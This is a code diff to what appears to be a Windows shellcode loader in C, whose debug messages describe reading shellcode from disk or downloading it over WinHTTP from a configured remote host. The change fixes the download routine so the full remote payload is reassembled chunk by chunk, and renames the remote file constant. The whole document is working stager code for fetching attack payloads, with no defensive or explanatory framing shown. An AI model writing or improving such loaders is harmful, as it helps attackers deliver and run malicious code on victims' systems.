@@ -36,6 +36,7 @@ BOOL ReadF(const char* file_path, PDWORD file_size, PVOID* read_buffer) {
 	}
 
 	fread(*read_buffer, 1, *file_size, file);
+	DEBUG_PRINT("[*] Reading shellcode from disk with size: %d\n", *file_size);
 	fclose(file);
 	return TRUE;
 }
@@ -105,35 +106,56 @@ BOOL Download(LPCWSTR url, LPCWSTR file, PCONTENT cnt) {
 				if (WinHttpReceiveResponse(hRequest, NULL)) {
 					DWORD Size = 0;
 					DWORD Downloaded = 0;
-					LPSTR download_buffer;
-					BOOL result = FALSE;
+					DWORD TotalSize = 0;
+					LPSTR download_buffer = NULL;
 
 					do {
-						Size = 0;
 						if (!WinHttpQueryDataAvailable(hRequest, &Size)) {
 							DEBUG_PRINT("[!] Error %d in WinHttpQueryDataAvailable.\n", GetLastError());
 						}
 
-						download_buffer = (LPSTR)malloc(Size + 1);
-						if (!download_buffer) {
-							DEBUG_PRINT("[!] Out of memory while downloading.\n");
-							Size = 0;
-						}
-						else {
-							ZeroMemory(download_buffer, Size + 1);
-							if (WinHttpReadData(hRequest, (LPVOID)download_buffer, Size, &Downloaded)) {
-								// Content is in download_buffer
-								cnt->data = download_buffer;
-								cnt->size = Size;
-								WinHttpCloseHandle(hRequest);
-								WinHttpCloseHandle(hConnect);
-								WinHttpCloseHandle(hSession);
-								DEBUG_PRINT("[*] Downloaded the shellcode with size: %d\n", Size);
-								free(download_buffer);
-								return TRUE;
+						if (Size > 0) {
+							LPSTR temp_buffer = (LPSTR)malloc(Size);
+							if (!temp_buffer) {
+								DEBUG_PRINT("[!] Out of memory while downloading.\n");
+								Size = 0;
+								break;
 							}
+
+							if (WinHttpReadData(hRequest, (LPVOID)temp_buffer, Size, &Downloaded)) {
+								LPSTR new_buffer = (LPSTR)realloc(download_buffer, TotalSize + Downloaded);
+								if (!new_buffer) {
+									DEBUG_PRINT("[!] Out of memory while reallocating buffer.\n");
+									free(temp_buffer);
+									Size = 0;
+									break;
+								}
+
+								download_buffer = new_buffer;
+								mymemcpy(download_buffer + TotalSize, temp_buffer, Downloaded);
+								TotalSize += Downloaded;
+							}
+
+							free(temp_buffer);
 						}
 					} while (Size > 0);
+
+					if (TotalSize > 0) {
+						cnt->data = download_buffer;
+						cnt->size = TotalSize;
+
+						WinHttpCloseHandle(hRequest);
+						WinHttpCloseHandle(hConnect);
+						WinHttpCloseHandle(hSession);
+
+						DEBUG_PRINT("[*] Downloaded the shellcode with size: %d\n", TotalSize);
+						return TRUE;
+					}
+					else {
+						free(download_buffer);
+						DEBUG_PRINT("[!] Download failed!\n");
+						return FALSE;
+					}
 
 				}
 				WinHttpCloseHandle(hRequest);
@@ -155,8 +177,8 @@ BOOL Download(LPCWSTR url, LPCWSTR file, PCONTENT cnt) {
 BOOL GetSC(PCONTENT cnt) {
 
 #ifdef WEB
-	if (!Download((LPCWSTR)HOST, (LPCWSTR)FILE, cnt)) {
-		DEBUG_PRINT(L"[!] Failed downloading %s from %s.\n", HOST, FILE);
+	if (!Download((LPCWSTR)HOST, (LPCWSTR)REMOTE_FILE, cnt)) {
+		DEBUG_PRINT(L"[!] Failed downloading %s from %s.\n", HOST, REMOTE_FILE);
 		return FALSE;
 	}
 
